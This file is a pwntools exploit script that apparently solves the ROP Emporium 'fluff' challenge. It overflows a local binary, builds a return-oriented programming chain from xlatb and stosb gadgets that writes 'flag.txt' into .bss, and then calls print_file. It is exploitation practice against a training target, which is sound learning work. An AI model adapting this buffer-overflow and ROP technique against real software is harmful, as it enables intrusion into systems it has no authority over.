from pwn import *

p = process('./fluff')
e = ELF('./fluff')

bss = e.bss()
POP_RDI = 0x00000000004006a3
POP_RDX = 0x000000000040062a
XLATB = 0x0000000000400628
STOSB = 0x0000000000400639
print_file = 0x400510
offset = b'A' * 40
f = 0x400552
l = 0x4003c1
a = 0x4005d2
g = 0x4003cf
dot = 0x400553
t = 0x400192
x = 0x4006c8
t = 0x400192

string_locations = [f, l, a, g, dot, t, x, t]
letters = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']

current_rax = 0xb # this is what rax starts with

payload = offset + p64(POP_RDI) + p64(bss)
for index, letter in enumerate(string_locations):
    payload += p64(POP_RDX)
    payload += p64(0x4000)
    payload += p64(letter - current_rax - 0x3ef2)
    payload += p64(XLATB)
    payload += p64(STOSB)
    current_rax = ord(letters[index])

payload += p64(POP_RDI)      # reset RDI to start of string
payload += p64(bss)          # RDI = 0x601038 again
payload += p64(print_file)

p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
